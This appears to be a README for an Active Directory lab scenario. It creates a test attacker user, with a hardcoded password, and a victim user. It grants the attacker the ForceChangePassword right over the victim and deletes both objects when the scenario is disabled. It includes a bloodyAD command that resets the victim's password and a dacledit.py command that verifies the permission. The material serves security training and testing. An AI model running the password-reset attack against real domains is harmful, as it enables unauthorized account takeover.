# acl-forcechangepassword

User that can reset another user's password (ForceChangePassword). Creates `scn-acl-fcp-attacker` (password `Aa1234567890!`) and the user `scn-acl-fcp-victim`, and gives the attacker `Ext-User-Force-Change-Password` (inheritance `None`) on it.

Attack:

    bloodyAD -d <domain> -u scn-acl-fcp-attacker -p 'Aa1234567890!' --host <dc ip> set password scn-acl-fcp-victim 'NewPassw0rd!'

How to verify:

    dacledit.py -action read -principal scn-acl-fcp-attacker -target scn-acl-fcp-victim <domain>/scn-acl-fcp-attacker:'Aa1234567890!' -dc-ip <dc ip>   # shows User-Force-Change-Password

Disable deletes both objects (the ACE goes with the target).
